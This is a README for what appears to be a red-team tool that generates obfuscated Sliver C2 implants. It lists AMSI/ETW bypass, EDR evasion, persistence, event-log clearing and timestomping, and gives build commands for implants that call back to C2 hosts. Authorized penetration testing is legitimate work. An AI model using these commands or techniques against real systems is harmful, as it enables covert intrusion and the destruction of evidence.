# Sliver C2 Custom Payload Generator

> **⚠️ LEGAL DISCLAIMER**  
> This tool is designed for **authorized penetration testing and security research only**.  
> Unauthorized use against systems you don't own or have explicit permission to test is **illegal**.  
> Users are solely responsible for compliance with applicable laws.

A Python-based payload generator that creates custom, obfuscated Go implants for Sliver C2 with advanced AV/EDR evasion, persistence mechanisms, and anti-forensics capabilities.

## Features

### 🛡️ AV/EDR Evasion
- **Direct/Indirect Syscalls** - Bypass userland hooks
- **AMSI Bypass** - Memory patching of AmsiScanBuffer
- **ETW Bypass** - Disable Event Tracing for Windows
- **Sandbox Detection** - VM/analysis environment detection
- **String Encryption** - Encrypt sensitive strings in binary
- **Polymorphic Code** - Each compilation produces unique binary

### 🔄 Persistence Mechanisms
- **Registry Run Keys** - HKCU/HKLM startup persistence
- **Scheduled Tasks** - Hidden tasks with SYSTEM privileges
- **WMI Event Subscriptions** - Fileless WMI-based persistence
- **COM Hijacking** - Hijack COM objects for persistence

### 🕵️ Forensics Evasion
- **Event Log Clearing** - Selective/full Windows Event Log deletion
- **Timestamp Stomping** - Match file timestamps to system files
- **Prefetch Manipulation** - Remove execution artifacts
- **USN Journal** - Manipulate filesystem change records

### 📦 Custom Packer
- **PE Section Encryption** - Encrypt .text/.data sections
- **Entropy Manipulation** - Reduce entropy scores to avoid detection
- **Code Signing** - Mandatory certificate signing (self-signed or custom)

## Installation

### Prerequisites
```bash
# Required tools
- Python 3.10+
- Go 1.21+
- MinGW-w64 (for Windows targets from Linux)

# Optional
- OpenSSL (for certificate generation)
- osslsigncode (for PE signing on Linux)
```

### Setup
```bash
# Clone/navigate to project
cd sliverpayload

# Install Python dependencies
pip3 install -r requirements.txt

# Install system dependencies (Debian/Ubuntu)
sudo apt install golang-go mingw-w64 openssl osslsigncode

# Verify Go installation
go version

# Make generator executable
chmod +x generator.py
```

## Usage

### Basic Payload Generation
```bash
python3 generator.py \
  --target windows \
  --arch x64 \
  --c2 https://192.168.1.100:443 \
  --obfuscation high \
  --output payload.exe
```

### With Evasion Techniques
```bash
python3 generator.py \
  --target windows \
  --arch x64 \
  --c2 https://10.0.0.1:8443 \
  --obfuscation high \
  --evasion syscalls \
  --evasion amsi-bypass \
  --evasion etw-bypass \
  --evasion sandbox-detect \
  --output implant.exe
```

### With Persistence
```bash
python3 generator.py \
  --target windows \
  --arch x64 \
  --c2 https://c2.example.com:443 \
  --obfuscation high \
  --evasion syscalls \
  --persistence registry \
  --persistence schtasks \
  --output persistent_payload.exe
```

### Full Stack (All Features)
```bash
python3 generator.py \
  --target windows \
  --arch x64 \
  --c2 https://192.168.1.100:443 \
  --obfuscation high \
  --evasion syscalls \
  --evasion amsi-bypass \
  --evasion etw-bypass \
  --persistence registry \
  --persistence wmi \
  --output full_implant.exe
```

## Configuration

Edit `config.yaml` to customize:

```yaml
compiler_paths:
  go: /usr/local/go/bin/go
  mingw: /usr/bin/x86_64-w64-mingw32-gcc

obfuscation:
  string_encryption: aes256
  identifier_length: 12
  junk_code_ratio: 0.2

evasion:
  syscalls: indirect
  amsi_bypass: true
  etw_bypass: true

persistence:
  enabled: true
  methods:
    - registry
    - schtasks

forensics_evasion:
  enabled: true
  eventlog_clear: true
  timestamp_stomp: true

signing:
  enabled: true  # MANDATORY
  generate_selfsigned: true
```

## Project Structure

```
sliverpayload/
├── generator.py          # Main CLI entry point
├── config.yaml           # Configuration file
├── requirements.txt      # Python dependencies
├── lib/                  # Core modules
│   ├── template_engine.py    # Template loading & variable injection
│   ├── obfuscator.py         # Code obfuscation
│   ├── compiler.py           # Go compilation wrapper
│   ├── packer.py             # Custom PE packer & signer
│   ├── evasion.py            # AV/EDR evasion techniques
│   ├── persistence.py        # Persistence mechanisms
│   └── forensics_evasion.py  # Anti-forensics techniques
├── templates/            # Go implant templates
│   ├── implant_go_basic.go      # Basic HTTP(S) implant
│   └── implant_go_syscalls.go   # Advanced syscall implant
├── snippets/             # Reusable code snippets
├── output/               # Generated payloads
└── tests/                # Unit tests

```

## Command-Line Options

| Option | Description | Values |
|--------|-------------|--------|
| `--target, -t` | Target platform | `windows`, `linux`, `macos` |
| `--arch, -a` | Architecture | `x64`, `x86`, `arm` |
| `--c2, -c` | C2 server URL | `https://IP:PORT` |
| `--obfuscation, -o` | Obfuscation level | `low`, `medium`, `high` |
| `--evasion, -e` | Evasion techniques | `syscalls`, `amsi-bypass`, `etw-bypass`, `sandbox-detect` |
| `--persistence, -p` | Persistence methods | `registry`, `schtasks`, `wmi`, `com-hijack` |
| `--output, -O` | Output file path | Path to save payload |
| `--config` | Config file | Path to YAML config |

## Testing

⚠️ **Test responsibly in isolated environments only!**

### VM Testing Setup
1. Set up isolated Windows VM (no network access to production)
2. Install Windows Defender with latest definitions
3. Generate payload and transfer to VM
4. Execute and observe detection

### Sliver C2 Server Setup
```bash
# Start Sliver server
sliver-server

# Create HTTPS listener
https --lport 443 --domain 192.168.1.100

# Wait for implant callback
sessions
```

## Development

### Adding New Evasion Techniques
1. Create snippet in `snippets/your_technique.go`
2. Add loader in `lib/evasion.py`
3. Update `config.yaml` with new option

### Adding New Templates
1. Create template in `templates/implant_*.go`
2. Use `{{VARIABLE}}` placeholders for injection
3. Update `lib/template_engine.py` to handle new template

## Troubleshooting

**Compilation fails:**
- Verify Go is installed: `go version`
- Check MinGW for Windows targets: `x86_64-w64-mingw32-gcc --version`

**Signing fails:**
- Install `osslsigncode`: `sudo apt install osslsigncode`
- Or disable signing in `config.yaml` (not recommended)

**Import errors:**
- Install dependencies: `pip3 install -r requirements.txt`

## Roadmap

- [ ] Additional implant languages (Rust, C)
- [ ] DLL/shellcode output formats
- [ ] Advanced process injection techniques
- [ ] Network traffic obfuscation (DNS, ICMP)
- [ ] Linux/macOS-specific evasion
- [ ] Integration with other C2 frameworks

## References

- [Sliver C2 Framework](https://github.com/BishopFox/sliver)
- [SysWhispers](https://github.com/jthuraisamy/SysWhispers)
- [AMSI Bypass Techniques](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
- [Windows Persistence Techniques](https://attack.mitre.org/tactics/TA0003/)

## License

This project is for **educational and authorized security testing purposes only**.

## Credits

Built for legitimate penetration testing workflows. Use responsibly.

---

**Remember:** Always obtain proper authorization before testing security controls.
